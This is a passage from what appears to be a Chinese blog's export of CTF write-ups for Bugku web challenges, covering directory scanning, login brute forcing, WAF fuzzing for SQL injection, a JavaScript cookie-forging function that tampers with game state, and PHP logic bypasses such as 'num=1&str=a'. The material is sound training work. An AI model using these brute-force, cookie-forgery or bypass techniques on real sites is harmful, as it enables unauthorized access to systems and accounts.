class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">        &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;admin.css&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;</span><br><span class="line">        &lt;form method=<span class="string">&quot;POST&quot;</span> action=<span class="string">&quot;#&quot;</span>&gt;</span><br><span class="line">            &lt;p&gt;&lt;input name=<span class="string">&quot;user&quot;</span> type=<span class="string">&quot;text&quot;</span> placeholder=<span class="string">&quot;Username&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;&lt;input name=<span class="string">&quot;password&quot;</span> type=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;Password&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;&lt;input value=<span class="string">&quot;Login&quot;</span> type=<span class="string">&quot;submit&quot;</span>/&gt;&lt;/p&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$KEY = <span class="string">&#x27;ISecer:www.isecer.com&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>总结一下：当cookie参数ISecer反序列化后完全等于变量KEY时输出flag</p>
<p>代码不难但是陷阱到不少，主要有二：</p>
<ol>
<li>看下格式化之后的代码，你发现了什么？</li>
<li>KEY变量被赋值的位置</li>
<li>老规矩，看不懂私信我，包教包会</li>
</ol>
<h2 id="羽化登仙"><a href="#羽化登仙" class="headerlink" title="羽化登仙"></a>羽化登仙</h2><p>填了坑，接下来就是舒服的获取flag环节了</p>
<p>Note：写到这里突然发现前面写的都凭空消失了，WTFK????????? 还好有Git，还原了文件内容，GIT牛脾</p>
<p>小插曲不要紧，flag才重要，上图</p>
<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag_php/6.png" class="">

<p>YES，收工</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>GIT真香</p>
<p>说错了，是具备良好的基础很重要</p>
<p>其实上一句也不重要，最重要的是不要被作者忽悠</p>
<p>其实也不对，相信自己的判断吧</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入2</title>
    <url>/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/1.png" class="">

<p>开幕雷击，打击我的自信心，BUT我是你能打击的人ma？</p>
<a id="more"></a>

<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/2.png" class="">

<p>又是一个登录框，肯定不简单</p>
<h2 id="寻找线索"><a href="#寻找线索" class="headerlink" title="寻找线索"></a>寻找线索</h2><p>CTF三剑客：看源码、看响应、扫目录</p>
<p>源码和响应都没什么内容，扫扫目录</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/3.png" class="">

<p>意外收获还真不少，站点存在.DS_Store文件和一个flag文件</p>
<h2 id="追寻真理"><a href="#追寻真理" class="headerlink" title="追寻真理"></a>追寻真理</h2><p>既然存在.DS_Store了，你懂得（老规矩：不想折腾环境直接上kali）</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/B1.png" class="">

<p>与扫描目录的结果一致</p>
<p>访问flag文件康康</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/4.png" class="">

<p>我靠，直接拿下？？？</p>
<h2 id="不甘平凡"><a href="#不甘平凡" class="headerlink" title="不甘平凡"></a>不甘平凡</h2><p>&emsp;&emsp;虽然说flag获得的出人意料，但是个人猜测是作者不小心搞错了文件名字导致flag文件可以直接下载（或者作者就是想告诉我们一个道理：通往罗马的路不止一条）接下来按照正常套路尝试一下</p>
<p>既然是登录框，很有可能是暴破或者SQLI</p>
<h2 id="尝试暴破"><a href="#尝试暴破" class="headerlink" title="尝试暴破"></a>尝试暴破</h2><p>随手测试两个用户：admin 123 和 123 123</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/5.png" class="">

<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/6.png" class="">

<p>根据提示，可以确定存在admin账户，所以接下来只需暴破admin的密码即可</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/A1.png" class="">

<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/A2.png" class="">

<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/A3.png" class="">

<p>&emsp;&emsp;暴破发现大量密码都可以登录至后台，这显然不正常，推测后台的处理逻辑为：如果当前会话已登录则直接跳转至admin首页不再进行二次验证</p>
<p>&emsp;&emsp;如果推测正确，那么第一个验证成功的应该就是正确的密码，查看一下数据包发现序号是从小至大的，由此可以判定admin123就是正确的密码，尝试登录</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/A4.png" class="">

<p>成功登录，此时我们发现系统提示我们输入ls，那就输入喽</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/A5.png" class="">

<p>拿到flag(好像随便输入点什么就可以得到flag)</p>
<h2 id="尝试SQL注入"><a href="#尝试SQL注入" class="headerlink" title="尝试SQL注入"></a>尝试SQL注入</h2><p>&emsp;&emsp;从系统的提示信息推断，后台先判断用户名是否正确然后再判断密码是否正确，结合前端源码（一般前端的name属性值和后台的SQL字段基本一致）</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/7.png" class="">

<p>结合以上信息，猜测后台处理逻辑为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; WAF过滤参数</span><br><span class="line"></span><br><span class="line">SELECT &#96;passwd&#96; FROM &#96;users&#96; WHERE &#96;uname&#96;&#x3D;input_name;</span><br><span class="line"></span><br><span class="line">if (input_passwd &#x3D;&#x3D; passwd) &#123;</span><br><span class="line">	&#x2F;&#x2F; 登录成功</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先测试uname字断，fuzz（模糊测试）一波，话不多说直接上图</p>
<p>说明：增加illegal匹配是因为WAF拦截时会提示illegal character</p>
<p>字典：<a href="https://blog.csdn.net/qq_45793883/article/details/104728901" alt="" target="_blank">传送门</a>（随便找的一个）</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/8.png" class="">

<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/9.png" class="">

<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/10.png" class="">

<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/11.png" class="">

<p>看着结果，总感觉不对劲。。。</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/sql%E6%B3%A8%E5%85%A52/1.png" class="">

<p>这特么还真是提示，给的都是合法的。。。。思维定式害死人</p>
<h2 id="艰难的攻坚战"><a href="#艰难的攻坚战" class="headerlink" title="艰难的攻坚战"></a>艰难的攻坚战</h2><p>合法字符：!、!=、=、+、-、^、%</p>
<p>没有逗号，UNION查询凉凉</p>
<p>可以用异或查询</p>
<p>函数记载：</p>
<ul>
<li>ASCII()函数返回字符的ASCII码值</li>
<li>MID() 函数用于从文本字段中提取字符</li>
<li>REVERSE函数：反转字符串</li>
</ul>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>Trim的日记本</title>
    <url>/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/Trim%E7%9A%84%E6%97%A5%E8%AE%B0%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/Trim%E7%9A%84%E6%97%A5%E8%AE%B0%E6%9C%AC/0.png" class="">

<p>作者告诉我们不要一次就放弃，看来又是一个攻坚战</p>
<a id="more"></a>

<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/Trim%E7%9A%84%E6%97%A5%E8%AE%B0%E6%9C%AC/1.png" class="">

<p>经典的登录页面，不过这个 mysql connect error ! 看着很刺眼啊，难不成题目BOOM了？</p>
<h2 id="开始尝试"><a href="#开始尝试" class="headerlink" title="开始尝试"></a>开始尝试</h2><p>&#12288;&#12288;本题有三个页面，登录、注册和重置密码，挨个尝试一遍发现都没什么可搞的，结合刺眼的消息，看来不会是暴破和注入了，一时之间没什么思路</p>
<p>CTF三剑客：看源码，看响应，扫目录</p>
<p>源码、响应都没什么特别的，扫扫目录</p>
<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/Trim%E7%9A%84%E6%97%A5%E8%AE%B0%E6%9C%AC/2.jpg" class="">

<p>也没什么特别的，更迷茫了，不过想到作者的提示，还是顺手换了一个字典扫一扫</p>
<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/Trim%E7%9A%84%E6%97%A5%E8%AE%B0%E6%9C%AC/3.jpg" class="">

<p>一扫吓一跳，多出个show.php，访问一下</p>
<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/Trim%E7%9A%84%E6%97%A5%E8%AE%B0%E6%9C%AC/4.png" class="">

<p>多搞几个字典果然有用，完美落幕</p>
<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>凡事都要多多尝试</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>江湖魔头</title>
    <url>/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/1.png" class="">

<p>浓重的网游风</p>
<a id="more"></a>

<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/2.png" class="">

<p>刷新几次都差不多，直接干</p>
<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/3.png" class="">

<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/4.png" class="">

<p>emmm…….从属性上看，想正常通关可能要1W年，怎么办呢？</p>
<p>作为一名DNF老玩家，深知装备不好的痛，所以解决之路…..肯定是开挂啊</p>
<h2 id="外挂研发之路"><a href="#外挂研发之路" class="headerlink" title="外挂研发之路"></a>外挂研发之路</h2><h3 id="第一步：找可修改的敏感资源"><a href="#第一步：找可修改的敏感资源" class="headerlink" title="第一步：找可修改的敏感资源"></a>第一步：找可修改的敏感资源</h3><img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/5.png" class="">

<p>看来看去，只有COOKIE值很可疑，不过加密了</p>
<h3 id="第二步：解密敏感资源"><a href="#第二步：解密敏感资源" class="headerlink" title="第二步：解密敏感资源"></a>第二步：解密敏感资源</h3><p>首先尝试直接URL解码-&gt;BASE64解码</p>
<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/6.png" class="">

<p>不出所料，失败了，不过既然是CTF，加密函数多少都会有点提示，康康源码</p>
<h3 id="第三步：源码审计"><a href="#第三步：源码审计" class="headerlink" title="第三步：源码审计"></a>第三步：源码审计</h3><img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/8.png" class="">

<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/9.png" class="">

<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/10.png" class="">

<p>md5.js和base64.js应该是引用公开的源码，script.js看着就问题很大而且做了混淆，BUT这能难得住我吗</p>
<p>这个混淆的名字我忘了，但是怎么处理记得很清楚，把eval删除其余的直接扔进console</p>
<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/11.png" class="">

<p>光速获取源码，分析一下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">cname</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name = cname + <span class="string">&quot;=&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> ca = <span class="built_in">document</span>.cookie.split(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ca.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> c = ca[i].trim();</span><br><span class="line">        <span class="keyword">if</span> (c.indexOf(name) == <span class="number">0</span>) <span class="keyword">return</span> c.substring(name.length, c.length)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode_create</span>(<span class="params">temp</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> base = <span class="keyword">new</span> Base64();</span><br><span class="line">    <span class="keyword">var</span> result = base.decode(temp);</span><br><span class="line">    <span class="keyword">var</span> result3 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; result.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> num = result[i].charCodeAt();</span><br><span class="line">        num = num ^ i;</span><br><span class="line">        num = num - ((i % <span class="number">10</span>) + <span class="number">2</span>);</span><br><span class="line">        result3 += <span class="built_in">String</span>.fromCharCode(num)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result3</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ertqwe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> temp_name = <span class="string">&quot;user&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> temp = getCookie(temp_name);</span><br><span class="line">    temp = <span class="built_in">decodeURIComponent</span>(temp);</span><br><span class="line">    <span class="keyword">var</span> mingwen = decode_create(temp);</span><br><span class="line">    <span class="keyword">var</span> ca = mingwen.split(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> key = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ca.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">-1</span> &lt; ca[i].indexOf(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">            key = ca[i + <span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    key = key.replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;img id=&quot;attack-1&quot; src=&quot;image/1-1.jpg&quot;&gt;&#x27;</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;attack-1&quot;</span>).src = <span class="string">&quot;image/1-2.jpg&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;attack-1&quot;</span>).src = <span class="string">&quot;image/1-3.jpg&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="number">2000</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;attack-1&quot;</span>).src = <span class="string">&quot;image/1-4.jpg&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="number">3000</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;attack-1&quot;</span>).src = <span class="string">&quot;image/6.png&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="number">4000</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            alert(<span class="string">&quot;你使用如来神掌打败了蒙老魔，但不知道是真身还是假身，提交试一下吧!flag&#123;&quot;</span> + md5(key) + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="number">5000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>意思就是执行ertqwe函数之后可以获取flag，不过是MD5形式的，所以现在的任务就是找到原始key</p>
<p>虽然觉得不会这么容易，但是不管怎么样先试试，打开console执行ertqwe函数</p>
<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/12.png" class="">

<p>whatfk？？？？简直就是逗我，看来这题没这么简单，继续审计源码</p>
<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/13.png" class="">

<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/14.png" class="">

<p>看来想获取key还是要先打败魔头…..</p>
<h3 id="第四步：篡改游戏数据"><a href="#第四步：篡改游戏数据" class="headerlink" title="第四步：篡改游戏数据"></a>第四步：篡改游戏数据</h3><p>数组还是不够直观，反序列化一下</p>
<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/15.png" class="">

<p>人物属性都在其中，只要修改数值重新加密发送打败魔头应该就能获取key了</p>
<p>大致流程：提取cookie–&gt;解密–&gt;修改数据–&gt;加密–&gt;发送至服务器–&gt;对返回的数据再次解密–&gt;提取key</p>
<p>解密搞定了，剩下的就是加密了，加密应该是解密的反操作，分析解密函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode_create</span>(<span class="params">temp</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> base = <span class="keyword">new</span> Base64(); <span class="comment">// 创建Base64对象</span></span><br><span class="line">    <span class="keyword">var</span> result = base.decode(temp); <span class="comment">// 对temp变量b64解码</span></span><br><span class="line">    <span class="keyword">var</span> result3 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; result.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> num = result[i].charCodeAt(); <span class="comment">// 把字符转换为Unicode编码</span></span><br><span class="line">        num = num ^ i; <span class="comment">// Unicode编码和下标异或</span></span><br><span class="line">        num = num - ((i % <span class="number">10</span>) + <span class="number">2</span>); <span class="comment">// 数值变换</span></span><br><span class="line">        result3 += <span class="built_in">String</span>.fromCharCode(num) <span class="comment">// 将Unicode编码转换为字符并追加至结果</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据解密函数写出加密函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode_create</span>(<span class="params">temp</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result3 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; temp.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> num = temp.charCodeAt(i);</span><br><span class="line">        num = num + ((i % <span class="number">10</span>) + <span class="number">2</span>);</span><br><span class="line">        num = num ^ i;</span><br><span class="line">        result3 += <span class="built_in">String</span>.fromCharCode(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> base = <span class="keyword">new</span> Base64();</span><br><span class="line">    <span class="keyword">var</span> result1 = base.encode(result3);</span><br><span class="line">    <span class="keyword">return</span> result1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此外，贴出辅助函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&#x27;O:5:&quot;human&quot;:10:&#123;s:8:&quot;xueliang&quot;;i:537;s:5:&quot;neili&quot;;i:618;s:5:&quot;lidao&quot;;i:59;s:6:&quot;dingli&quot;;i:77;s:7:&quot;waigong&quot;;i:0;s:7:&quot;neigong&quot;;i:0;s:7:&quot;jingyan&quot;;i:0;s:6:&quot;yelian&quot;;i:0;s:5:&quot;money&quot;;i:200000;s:4:&quot;flag&quot;;s:1:&quot;0&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> miwen = encode_create(str);</span><br><span class="line">    <span class="keyword">var</span> encrypt = <span class="built_in">encodeURIComponent</span>(miwen);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(encrypt);</span><br><span class="line">    <span class="built_in">document</span>.cookie = <span class="string">&quot;user=&quot;</span> + encrypt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们缺的其实就是一个字：钱（本次修改为20W元宝）</p>
<p>在console中执行函数，修改客户端数据</p>
<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/16.png" class="">

<p>点击属性查看是否修改成功</p>
<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/17.png" class="">

<p>这……肯定是出问题了，重新翻看源码</p>
<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/18.png" class="">

<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/19.png" class="">

<p>编码解码不对称，果然有问题（不愧是我），注释掉编码中指定的行</p>
<p>在线修改源码很麻烦，所以个人把源码copy到本地修改后生成加密的cookie</p>
<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/20.png" class="">

<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/21.png" class="">

<p>修改数据后刷新一下看看效果</p>
<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/22.png" class="">

<p>YES，摇身一变成土豪，接下来就是愉快的买买买了，最后一掌打死老恶魔</p>
<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/23.png" class="">

<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>通过花钱可以知道各个属性的最大值，那么。。。如果超出范围呢，比如都是经典的8个9</p>
<img src="/2020/09/27/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4/24.png" class="">

<p>还是别太贪了</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>web26</title>
    <url>/2020/09/28/CTF/WEB/CTF%E8%AE%BA%E5%89%91%E5%9C%BA/web26/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/28/CTF/WEB/CTF%E8%AE%BA%E5%89%91%E5%9C%BA/web26/1.png" class="">

<p>源码审计题</p>
<a id="more"></a>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$num=$_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">$str=$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($num) &amp;&amp; <span class="keyword">isset</span>($str)) &#123;</span><br><span class="line">    <span class="comment">// 正则匹配str参数是否包含数字</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\d+/sD&#x27;</span>,$str)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;vagetable hhhh&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果is_numisic校验两个参数均为true则输出flag</span></span><br><span class="line">    $result=is_numeric($num) <span class="keyword">and</span> is_numeric($str);</span><br><span class="line">    <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;$flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;vagetablessssss&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>总结：如果str不包含数字但是is_numeric函数返回true则输出flag</p>
<p>不知你是否觉得这一幕似曾相识？</p>
<h2 id="直指flag"><a href="#直指flag" class="headerlink" title="直指flag"></a>直指flag</h2><p>构造payload：num=1&amp;str=a</p>
<img src="/2020/09/28/CTF/WEB/CTF%E8%AE%BA%E5%89%91%E5%9C%BA/web26/2.png" class="">

<p>拿下，睡觉去</p>
]]></content>
      <categories>
        <category>CTF-CTF论剑场(Bugku新版)-WEB</category>
